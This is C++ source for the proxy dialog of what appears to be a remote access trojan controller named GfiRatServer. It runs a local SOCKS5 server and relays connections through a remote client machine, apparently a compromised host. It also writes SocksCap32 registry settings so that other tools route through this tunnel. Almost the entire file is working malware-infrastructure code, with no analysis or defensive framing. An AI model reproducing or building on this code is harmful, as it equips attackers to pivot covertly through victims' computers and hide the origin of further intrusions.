// ProxyDlg.cpp : implementation file
//作者：baijianli qq:80202621

#include "pch.h"
#include "GfiRatServer.h"
#include "ProxyDlg.h"
#include "RegEditEx.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CProxyDlg dialog


CProxyDlg::CProxyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext
/*=NULL*/) : CDialog(CProxyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CProxyDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_iocpLocal = NULL;

}

void CProxyDlg::AddLog(TCHAR* lpText)
{
	m_edit.SetSel(-1, -1);
	m_edit.ReplaceSel(lpText);
}
void CProxyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CProxyDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	// NOTE: the ClassWizard will add DDX and DDV calls here
//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CProxyDlg, CDialog)
	//{{AFX_MSG_MAP(CProxyDlg)
	ON_WM_CLOSE()
	//	ON_MESSAGE(WM_NOTIFYPROC, OnNotifyProc)
		//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CProxyDlg message handlers
LRESULT CProxyDlg::OnNotifyProc(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	DWORD index = pContext->dwID;
	TCHAR szMsg[200] = { 0 };
	try
	{
		/*str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);*/

		switch (wParam)
		{
		case NC_CLIENT_CONNECT:
			pContexts[index] = pContext;
			wsprintf(szMsg, _T("%d new connection\r\n"), index);
			break;
		case NC_CLIENT_DISCONNECT:
			if (pContext->m_bProxyConnected)
			{
				BYTE lpData[5];
				lpData[0] = COMMAND_PROXY_CLOSE;
				memcpy(lpData + 1, &index, sizeof(DWORD));
				m_iocpServer->Send(m_pContext, lpData, 5);
			}
			wsprintf(szMsg, _T("%d disconnect\r\n"), index);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			if (pContext->m_bProxyConnected == 2)
			{
				m_iocpServer->Send(m_pContext, pContext->m_CompressionBuffer.GetBuffer(),
					pContext->m_CompressionBuffer.GetBufferLen());
				wsprintf(szMsg, _T("%d <==发 %d bytes\r\n"), index, pContext->m_CompressionBuffer.GetBufferLen() - 5);
				//Sleep(10);
			}
			else if (pContext->m_bProxyConnected == 0)
			{
				BYTE buf[2];
				LPBYTE lpData = pContext->m_CompressionBuffer.GetBuffer(5);
				buf[0] = 5;
				buf[1] = 0;
				pContext->m_bProxyConnected = 1;
				m_iocpLocal->Send(pContext, buf, 2);
				wsprintf(szMsg, _T("%d 返回标示 %d %d %d\r\n"), index, lpData[0], lpData[1], lpData[2]);
			}
			else if (pContext->m_bProxyConnected == 1)
			{
				LPBYTE lpData = pContext->m_CompressionBuffer.GetBuffer(5);
				BYTE buf[11];
				if (lpData[0] == 5 && lpData[1] == 1 && lpData[3] == 1 & pContext->m_CompressionBuffer.GetBufferLen() > 10)
				{
					buf[0] = COMMAND_PROXY_CONNECT;
					memcpy(buf + 1, &index, 4);
					memcpy(buf + 5, lpData + 4, 6);
					m_iocpServer->Send(m_pContext, buf, sizeof(buf));
					in_addr inaddr;
					inaddr.s_addr = *(DWORD*)(buf + 5);
#ifdef _UNICODE
					char szmsg1[MAX_PATH];
					wsprintfA(szmsg1, "%d connecting %s:%d...\r\n", index, inet_ntoa(inaddr), ntohs(*(USHORT*)(buf + 9)));
					MultiByteToWideChar(CP_ACP, 0, szmsg1, -1, szMsg, sizeof(szMsg) / sizeof(szMsg[0]));
#else
					wsprintf(szMsg, _T("%d connecting %s:%d...\r\n"), index, inet_ntoa(inaddr), ntohs(*(USHORT*)(buf + 9)));
#endif
				}
				else
				{
					buf[0] = 5;
					buf[1] = 7;
					buf[2] = 0;
					buf[3] = lpData[3];
					m_iocpLocal->Send(pContext, buf, sizeof(buf));
					closesocket(pContext->m_Socket);
					wsprintf(szMsg, _T("%d 不符要求,断开 %d %d %d\r\n"), index, lpData[0], lpData[1], lpData[3]);
				}
			}
			break;
		}
	}
	catch (...) {}
	if (szMsg[0]) AddLog(szMsg);
	return 0;
}
BOOL CProxyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	CString		str;
	DWORD		nPort;
	m_iocpLocal = new CIOCPLOCAL;
	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 开启IPCP服务器
	if (m_iocpLocal->Initialize(NotifyProc, (CGfiRatServerDlg*)this, 100000, 0))
	{
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		getsockname(m_iocpLocal->m_socListen, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		nPort = ntohs(sockAddr.sin_port);
		str.Format(_T("\\\\代理服务器 端口: %d \r\n"), nPort);
		SetWindowText(str);
		WriteRegEx(HKEY_CURRENT_USER, _T("Software\\Permeo Technologies\\SocksCap32\\Connections"),
			_T("SocksPort"), REG_DWORD, (TCHAR*)&nPort, nPort, 1);
		WriteRegEx(HKEY_CURRENT_USER, _T("Software\\Permeo Technologies\\SocksCap32\\Connections"),
			_T("SocksServer"), REG_SZ, _T("127.0.0.1"), 0, 1);
		TCHAR szMsg[260];
		wsprintf(szMsg, _T("已设置sockscap32，使用其他socks代理软件请设置服务器为:127.0.0.1, 端口为:%d \r\n"), nPort);
		AddLog(szMsg);

	}
	else
	{
		str.Format(_T("\\\\代理服务器 端口绑定失败 \r\n"));
		SetWindowText(str);
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}
void CProxyDlg::OnReceiveComplete()
{
	if (m_iocpLocal == NULL) return;
	LPBYTE buf = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	DWORD index = *(DWORD*)&buf[1];
	TCHAR szMsg[200];
	switch (buf[0])
	{
	case TOKEN_PROXY_CONNECT_RESULT:
		BYTE sendbuf[10];
		sendbuf[0] = 5;
		sendbuf[1] = (buf[9] || buf[10]) ? 0 : 5;
		sendbuf[2] = 0;
		sendbuf[3] = 1;
		memcpy(&sendbuf[4], &buf[5], 6);
		if (sendbuf[1] == 0)
		{
			pContexts[index]->m_bProxyConnected = 2;
			wsprintf(szMsg, _T("%d 连接成功\r\n"), index);
		}
		else
			wsprintf(szMsg, _T("%d 连接失败\r\n"), index);
		m_iocpLocal->Send(pContexts[index], sendbuf, sizeof(sendbuf));
		AddLog(szMsg);
		break;
	case TOKEN_PROXY_BIND_RESULT:
		break;
	case TOKEN_PROXY_CLOSE:
		wsprintf(szMsg, _T("%d TOKEN_PROXY_CLOSE\r\n"), index);
		AddLog(szMsg);
		if (pContexts[index]->m_Socket && pContexts[index]->m_Socket != INVALID_SOCKET)
		{
			LINGER lingerStruct;
			lingerStruct.l_onoff = 1;
			lingerStruct.l_linger = 1;
			setsockopt(pContexts[index]->m_Socket, SOL_SOCKET, SO_LINGER,
				(char*)&lingerStruct, sizeof(lingerStruct));
			shutdown(pContexts[index]->m_Socket, SD_SEND);
			closesocket(pContexts[index]->m_Socket);
			pContexts[index]->m_Socket = 0;
		}
		break;
	case TOKEN_PROXY_DATA:
		m_iocpLocal->Send(pContexts[index], &buf[5], m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5);
		wsprintf(szMsg, _T("%d ==>收 %d bytes\r\n"), index, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5);
		AddLog(szMsg);
		break;
	default:
		// 传输发生异常数据
		break;
	}

}
void CProxyDlg::OnClose()
{
	// TODO: Add your message handler code here and/or call default


	shutdown(m_pContext->m_Socket, SD_SEND);
	closesocket(m_pContext->m_Socket);
//	delete m_iocpLocal;

	CDialog::OnClose();
	//delete m_iocpLocal;
	//m_iocpLocal = NULL;
	//shutdown(m_pContext->m_Socket, SD_SEND);
	//closesocket(m_pContext->m_Socket);
	//CDialog::OnClose();
}
void CALLBACK CProxyDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
//#ifdef _DEBUG
//	((CProxyDlg*)lpParam)->SendMessage(WM_NOTIFYPROC, nCode, (LPARAM)pContext);
//#else
	((CProxyDlg*)lpParam)->OnNotifyProc(nCode, (LPARAM)pContext);
//#endif
}
